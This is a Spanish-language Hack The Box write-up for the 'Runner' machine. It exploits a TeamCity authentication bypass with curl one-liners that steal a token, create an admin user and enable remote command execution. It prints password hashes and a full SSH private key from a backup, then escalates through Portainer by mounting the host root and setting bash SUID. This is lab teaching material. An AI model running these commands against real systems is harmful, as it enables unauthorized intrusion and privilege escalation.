---
layout: post
title: Runner - Hack The Box
date: 2025-10-17
categories: [htb, linux]
tags:  [Linux, Web, API, Code, Execution, Suid, CVE, Docker, Portainer]
image:
  path: htb-writeup-runner/runner.png
  alt: runner
---

![logo](htb-writeup-runner/runner-logo.png){: .right w="200" h="200" }

Runner es una máquina Linux de dificultad media que contiene una vulnerabilidad [CVE-2023-42793] en `TeamCity`. Esta vulnerabilidad permite a los usuarios eludir la autenticación y extraer un token API, que puede utilizarse para habilitar funciones de depuración para ejecutar comandos del sistema. Al obtener acceso a un contenedor Docker de `TeamCity` y comprimir los archivos de la base de datos `HSQLDB`, podemos extraer las credenciales del usuario `matthew` y encontrar una clave `SSH` para `john`. Después de descifrar la contraseña, podemos autenticarnos en el sistema de archivos del host. Al inspeccionar el archivo `/etc/hosts`, descubrimos una instancia de `Portainer` en ejecución. Utilizando las credenciales de «matthew», accedemos al subdominio desde el exterior. Una vez autenticados, descubrimos que podemos crear imágenes, pero nuestros privilegios son limitados. Después de comprobar la versión en el host, explotamos una vulnerabilidad [CVE-2024-21626] a través de la función de creación de imágenes de `Portainer`, lo que nos permite crear un archivo bash SUID en el host

## Reconocimiento

### Nmap

En la parte inicial del reconocimiento vamos a iniciar con un escane de puertos basico

```bash
nmap -p- --open -T3 -n <IP>
```

- -p-
  + Escanear todo el rango de puertos (65535)

- --open
  + Reportar solo los puertos abiertos

- -T3
  + Aumentar la velocidad de escaneo, existen desde T1 a T5

- -n
  + Anular la resolucion DNS (No hacer resolución DNS) Ya que DNS es generalmente lento, esto acelera un poco las cosas

```bash
-> Puertos Abiertos
-> 22
-> 80
-> 8000
```

### Nmap Servicios de Puertos

Posterior al escaneo de puertos vamos a identificar la version y servicio que corre en cada uno y vamos a guardarlo como archivo de documentacion `ports`

```bash
nmap -p22,80,8000 -sCV <IP> -oN ports
```

```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Runner - CI/CD Specialists
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web

La web nos redirige a runner.htb, este seria el dominio de la pagina

```bash
echo '<IP> runner.htb' >> /etc/hosts
```

De esta manera vamos a incorporarlo a nuestro archivo `/etc/hosts` donde a la hora de visitar la web nos va a resolver correctamente

![](htb-writeup-runner/runner1.png)

Como se muestra en la imagen, esta web solo es estatica y no presenta botones con funcionalidades web como registrarse o loguearse, etc. Voy a probar buscando archivos lekeados con dirsearch

### Enumeracion Web Fuzz

```ruby
dirsearch --url http://runner.htb/ -t 50     
_|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/mrincreible/HTB/runner/reports/http_runner.htb/__24-10-28_14-09-52.txt

Target: http://runner.htb/

[14:09:52] Starting:                                                                                                                                                       
[14:10:18] 301 -  178B  - /assets  ->  http://runner.htb/assets/            
[14:10:18] 403 -  564B  - /assets/
```

No encontramos nada relevante en esta parte de fuzzear por archivos o templates de la web, asi que vamos a seguir con la enumeracion de subdominios con wfuzz. Es importante tener una buena metodologia a la hora de enumerar aplicaciones web.

### Enumeracion Web Fuzz Domain

```bash
wfuzz -c --hc=404 --hh=154 -t 100 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host: FUZZ.runner.htb' http://runner.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://runner.htb/
Total requests: 100000
=====================================================================
ID           Response   Lines    Word       Chars       Payload     
=====================================================================
000013170:   401        1 L      9 W        66 Ch       "teamcity"
```

Agregare este subdominio al /etc/hosts

```bash
echo '<IP> runner.htb teamcity.runner.htb' >> /etc/hosts 
```

nos redirige a `http://teamcity.runner.htb/login.html`

![](htb-writeup-runner/runner2.png)

### Enumeracion Web Team City

Que es TeamCity?

Está diseñado para mejorar el proceso de desarrollo de software mediante la automatización de tareas rutinarias como la creación, prueba e implementación de código . TeamCity se destaca por su interfaz fácil de usar, su integración integral con sistemas de control de versiones y sus amplias capacidades de creación, prueba e implementación

bien!!! tenemos un panel de login de esta app, tenemos que tratar de bypassear este panel. Una vez dentro imagino que habran usuarios y administradores, la version es la 2023.05.03

Si realizamos una busqueda en searchsploit?

![](htb-writeup-runner/runner3.png)

Tenemos un PoC, pero nosotros vamos a leer el codigo y tratar de explotarlo de forma manual.

### Explotacion [CVE-2023-42793]

```python
if url.startswith("https://"):
    curl_command = "curl -k"
else:
    curl_command = "curl"

get_token_url = f"{url}/app/rest/users/id:1/tokens/RPC2"
delete_token_url = f"{url}/app/rest/users/id:1/tokens/RPC2"
create_user_url = f"{url}/app/rest/users"

create_user_command = ""
token = ""

response = requests.post(get_token_url, verify=False)
```

En esta parte hace una validacion por si la web tiene SSL, si tiene hace un `curl -K` de lo contrario realiza un curl normal. Luego hace una llamada por POST a `/app/rest/users/id:1/tokens/RPC2` esto te genera un token con privilegios, es ahi donde esta el fallo de TeamCity:

El endpoint `/app/rest/users/id:1/tokens/RPC2` se encuentra expuesto al publico sin requerir autenticacion, de aqui se puede conseguir un token de autenticacion con privilegios elevados.

```python
elif response.status_code == 404:
    print("Token already exists")
    delete_command = f'{curl_command} -X DELETE {delete_token_url}'
    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    delete_process.wait()
    delete_output = delete_process.communicate()
    if delete_process.returncode == 0:
        print("Previous token deleted successfully\nrun this command again for creating new token & admin user.")
    else:
        print("Failed to delete the previous token")
```

no se pueden generar 2 tokens, pero hay una manera de borrar el token actual que generamos con el Metodo `curl -X DELETE`

```python
if token:
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
    username = f"city_admin{random_chars}"
    data = {
        "username": username,
        "password": "Main_password!!**",
        "email": "angry-admin@funnybunny.org",
        "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
    }
```

Luego entramos a esta parte que es la mas interesante, una vez que tengamos el token podemos crear un usuario con privilegios de la siguiente manera, en el PoC agrega las cabezeras `Authorization: Bearer {token}` y `Content-Type: application/json`, este exploit crea un usario aleatorio pasandole caracteres extraños, nosotros vamos a modificar eso. En data vamos a poner el nombre de usuario que nosotros queremos y en password lo mismo. Ya Les Muestro un Oneliner potente en `CURL`

Antes de continuar hay que saber lo siguiente: este metodo solo nos crea un usuario con privilegios pero existe otra manera de la cual nos podemos aprovechar ejecutando comandos desde un endpoint. Esto lo vamos a ver despues

```bash
curl -s -X POST "http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2"

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-10-28T14:08:19.584Z" value="eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2"/>
```

en `value` nos sale el token que obtuvimos, este servira para el siguiente onliner. Estaria ubicandolo en `Authorization: eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2`

```bash
curl -s -X POST "http://teamcity.runner.htb/app/rest/users" -H 'Authorization: {TOKEN}' -H 'Content-Type: application/json' -d '{"email": "atreus@runner.htb", "username": "atreus", "password": "atreus123$!", "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}'

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="atreus" id="11" email="atreus@runner.htb" href="/app/rest/users/id:11"><properties count="3" href="/app/rest/users/id:11/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="atreus"/><property name="teamcity.server.buildNumber" value="129390"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:11/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>
```

el resultado es la creacion de un usuario con privilegios de administrador

![](htb-writeup-runner/runner4.png)

### Intrusion Via Web

Una vez dentro de la aplicacion web podemos ir a la parte de administracion y abajo nos vamos a encontrar con una seccion de `BACKUP`

![](htb-writeup-runner/runner5.png)

![](htb-writeup-runner/runner6.png)

Haciendo click en Start Backup se descargara un archivo ZIP. Una vez en tenencia del archivo vamos a descomprimirlo

```bash
7z l TeamCity_Backup_20241028_142213.zip 

7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
 64-bit locale=C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 266056 bytes (260 KiB)

Listing archive: TeamCity_Backup_20241028_142213.zip

--
Path = TeamCity_Backup_20241028_142213.zip
Type = zip
Physical Size = 266056
Comment = TeamCity data backup; ZIP factory in use: memory-conservative (dynamic, shared); compression level -1.

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2024-10-28 14:22:12 .....           92           70  version.txt
2024-10-28 14:22:12 .....           45           47  metadata/metadata-version.dat
2024-10-28 14:22:12 .....            6            8  charset
2024-10-28 14:22:12 .....          637          310  metadata/backup.config
2024-10-28 14:22:12 .....        67388        11783  metadata/schema.config
2024-10-28 14:22:12 .....           50           46  database_dump/db_version
2024-10-28 14:22:12 .....       112098        18694  database_dump/meta_file_line
2024-10-28 14:22:12 .....           14           16  database_dump/single_row
2024-10-28 14:22:12 .....           88           86  database_dump/server_property
2024-10-28 14:22:12 .....          121           97  database_dump/backup_info
2024-10-28 14:22:12 .....          151          123  database_dump/domain_sequence
2024-10-28 14:22:12 .....          149          128  database_dump/project
2024-10-28 14:22:12 .....           95           65  database_dump/vcs_root
2024-10-28 14:22:12 .....           85           53  database_dump/project_mapping
2024-10-28 14:22:12 .....           46           43  database_dump/vcs_root_mapping
2024-10-28 14:22:12 .....           90           68  database_dump/agent_pool
2024-10-28 14:22:12 .....           88           82  database_dump/usergroups
2024-10-28 14:22:12 .....          428          309  database_dump/users
2024-10-28 14:22:12 .....          926          326  database_dump/user_property
2024-10-28 14:22:12 .....          257          136  database_dump/usergroup_notification_events
2024-10-28 14:22:12 .....          373          165  database_dump/usergroup_watch_type
2024-10-28 14:22:12 .....          129           83  database_dump/usergroup_notification_data
2024-10-28 14:22:12 .....           53           55  database_dump/remember_me
2024-10-28 14:22:12 .....          286          219  database_dump/permanent_tokens
2024-10-28 14:22:12 .....           48           45  database_dump/user_projects_visibility
2024-10-28 14:22:12 .....           51           49  database_dump/agent_pool_project
2024-10-28 14:22:12 .....          135           93  database_dump/vcs_username
2024-10-28 14:22:12 .....           42           43  database_dump/build_queue_order
2024-10-28 14:22:12 .....          125           87  database_dump/user_roles
2024-10-28 14:22:12 .....           71           58  database_dump/usergroup_roles
2024-10-28 14:22:12 .....          370          208  database_dump/stats_publisher_state
2024-10-28 14:22:12 .....          690          320  database_dump/comments
2024-10-28 14:22:12 .....          346          167  database_dump/action_history
2024-10-28 14:22:12 .....          766          293  database_dump/audit_additional_object
2024-10-28 14:22:12 .....         1543          341  database_dump/server_statistics
2024-10-28 14:22:12 .....        27042         2291  database_dump/node_tasks
2024-10-28 14:22:12 .....          116          110  database_dump/node_locks
2024-10-28 14:22:12 .....          163          122  database_dump/server_health_items
2024-10-28 14:22:12 .....           25           24  database_dump/hidden_health_item
2024-10-28 14:22:12 .....         1182          350  database_dump/config_persisting_tasks
2024-10-28 14:22:12 .....           24           26  database_dump/server
2024-10-28 12:47:24 .....          311          204  config/_notifications/ide_notificator/tests_unmuted.ftl.dist
2024-10-28 12:46:38 .....        24199         2312  config/_logging/debug-commit-status.xml
2024-10-28 12:47:24 .....          434          274  config/_notifications/ide_notificator/build_probably_hanging.ftl.dist
```

backups de bases de datos, quizas podemos encontrar algunos hashes crackeables. Antes de seguir con eso y no volvernos locos a la hora de enumerar estas bases de datos, vamos a buscar en teamcity que usuarios validos tenemos:

![](htb-writeup-runner/runner7.png)

- Admin
  + John -> `John@runner.htb`

- Matthew
  + Matthew -> `Matthew@runner.htb`

Usuarios validos a nivel de sistema, tenemos el puerto 22 abierto esto quiere decir que la shell tiene que venir por ese puerto.

Lo siguiente sera filtrar con el comando `grep` por hashes para crackearlos

```bash
grep -ri "john"
database_dump/comments:201, -42, 1709746543407, "New username: \'admin\', new name: \'John\', new email: \'john@runner.htb\'"
database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1730124582065, BCRYPT

grep -ri "matthew"
database_dump/vcs_username:2, anyVcs, -1, 0, matthew
database_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
config/_trash/AllProjects.project1/project-config.xml:  <description>Matthew's projects</description>
config/projects/AllProjects/project-config.xml.1:  <description>Matthew's projects</description>
system/pluginData/audit/configHistory/projects/project1/config.xml.1:  <description>Matthew's projects</description>
```

logramos ver el hash de admin y matthew que son los usuarios a nivel de sistema o contenedor.

- admin
  + $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye

- matthew
  + $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em

vamos intentar crackearlos con `johntheripper` pasandole el diccionario `rockyou.txt` que es un diccionario grande y tipico en estos ataques de crackeo de contraseñas.

```bash
john --show hash                                     
?:piper123

1 password hash cracked, 0 left
```

solo nos crackea uno, el otro hash queda ahi... vamos a intentar entrar por ssh con esta contraseña pasandole el usuario john y matthew pero no sirve para ninguno, asi que no perdamos tiempo con esto. Vamos a seguir enumerando buscando alguna id_rsa

```bash
find . -name "id_rsa" 2>/dev/null | cat ./config/projects/AllProjects/pluginData/ssh_keys/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
```

Bingo.... Tenemos una clave privada id_rsa para entrar por ssh y ejecutar comandos, muy bien... ya llegamos hasta esta parte... ahora voy a explicar otra manera para conseguir RCE en la maquina.... nos vamos a aprovechar de un endpoint de teamcity.

### Intrusion Via Web Metodo 2

Para este metodo el post [CVE-2023-42793](https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis) nos indica que tenemos que habilitar el modo debug para conseguir RCE

```bash
curl -s -X POST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=id" -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2' 
Responding with error, status code: 400 (Bad Request).
Details: jetbrains.buildServer.server.rest.errors.BadRequestException: This server is not configured to allow process debug launch via "rest.debug.processes.enable" internal property
Invalid request. Please check the request URL and data are correct.
```

nos tira ese error porque todavia no habilitamos el modo debug, asi que vamos a hacerlo

```bash
curl -X POST 'http://teamcity.runner.htb/admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true' -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'
```

bien, ahora la parte final es volver a ejecutar el primer comando que realizamos

```bash
curl -s -X POST "http://teamcity.runner.htb/app/rest/debug/processes?exePath=id" -H 'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.YnJ6SzVjU0l0UmZYWFZtMld3emI4X2NwdTFZ.NTNhNzM2YTUtN2I1NS00M2VkLWIyNDEtOWNkMTkyOGM0NDA2'
StdOut:uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)

StdErr: 
Exit code: 0
Time: 27ms
```

aclaro que este token es el primero que me dio teamcity a la hora de crear mi usuario con privilegios maximos si necesitan volver a generarlo en la explicacion del PoC explico como borrar el token y por logica crear otro. Yo prefiero obtener una shell por SSH porque es mas comodo la TTY.

A la clave privada le tienen que asignar privilegios 600 con chmod y luego pasarle el -i para importar la id_rsa

## Escalada de Privilegios

![](htb-writeup-runner/runner8.png)

![](htb-writeup-runner/runner9.png)

Enumerando los puertos abiertos dentro de la maquina nos encontramos con el puerto 9000 abierto internamente, posterior a eso con ps queremos ver lo que se esta ejecutando en ese puerto, pero sin exito.

```bash
john@runner:~$ mount | grep proc
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=19243)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,nosuid,nodev,noexec,relatime)
```

No podemos ver procesos que corren de otros usuarios en el hipeid -> esta en invisible

```bash
john@runner:~$ curl -s http://localhost:9000 | head -n 3
<!doctype html><html lang="en" ng-app="portainer" ng-strict-di data-edition="CE"><head><meta charset="utf-8"/><title>Portainer</title><meta name="description" content=""/><meta name="author" content="Portainer.io"/><meta http-equiv="cache-control" content="no-cache"/><meta http-equiv="expires" content="0"/><meta http-equiv="pragma" content="no-cache"/><base id="base"/><script>if (window.origin == 'file://') {
        // we are loading the app from a local file as in docker extension
        document.getElementById('base').href = 'http://localhost:49000/';
```

Viendo lo que hay en el puerto 9000, notamos que es un `portainer.io` y vemos la palabra docker... ahora todo tiene sentido con las 2 intrusiones, si hubiesemos entrado con el RCE del metodo debug hubieramos ganado acceso dentro de un contendor `portainer`, teniendo en cuenta todo esto vamos a realizar un Local Port Fordwarding con SSH

![](htb-writeup-runner/runner10.png)

![](htb-writeup-runner/runner11.png)

Es importante anotar todo lo que conseguimos a la hora de enumerar la maquina, recordemos que tenemos credenciales de matthew y no nos sirivieron para nada. En esta ocasion puede ser que funcione

![](htb-writeup-runner/runner12.png)

Que es Portainer?
Portainer es una herramienta web open-source la cual se ejecuta ella misma como un container, por tanto deberemos tener Docker instalado. Esta aplicación nos va a permitir gestionar de forma muy fácil e intuitiva nuestros contenedores Docker a través de una interfaz gráfica.

Listo estamos dentro de portainer lo primero que haria como atacante es buscar en que version estamos y ir viendo como podemos aprovecharnos de los contenedores, podemos ver malas configuraciones de docker o vulnerabilidades asociadas a CVEs.

Si clickeo en `primary` tenemos mas opciones y configuraciones las mas importantes son `images`

```bash
Tenemos 2 imagenes: ubuntu:latest, teamcity:latest
```

![](htb-writeup-runner/runner13.png)

Tambien tenemos 2 volumenes, un volumen en docker es un área de almacenamiento de datos que puede montarse en un contenedor para proporcionar almacenamiento persistente, si leemos la documentacion de portainer nos muestra como crear un volumen. Yo creo que esta seria nuestra via para escalar privilegios.

![](htb-writeup-runner/runner14.png)

Le damos a add volume y agregamos estas configuraciones para crear el volumen

![](htb-writeup-runner/runner15.png)

Con esto ya tendriamos creado el nuevo volumen.

![](htb-writeup-runner/runner16.png)

Ahora nos dirigimos a containers y clickeamos a add container para crear un nuevo contenedor

![](htb-writeup-runner/runner17.png)

Nombre test y en la imagen ponemos la imagen teamcity:latest... y abajo en configuracion avanzada vamos a agregar estos parametros.. `Interactive & TTY` y en volumes `/mnt/root` para traernos la maquina real como una montura

![](htb-writeup-runner/runner18.png)

![](htb-writeup-runner/runner19.png)

Clickeamos en deploy the container.... una vez que se cree vamos a clickear en el contenedor y darle en console para conseguir una shell grafica en la web

![](htb-writeup-runner/runner20.png)

En `user` vamos a poner root y a darle a connect y listo.... en la carpeta `mnt/root` vamos a tener la maquina real y darle permisos SUID a la bash para escalar privilegios

![](htb-writeup-runner/runner21.png)
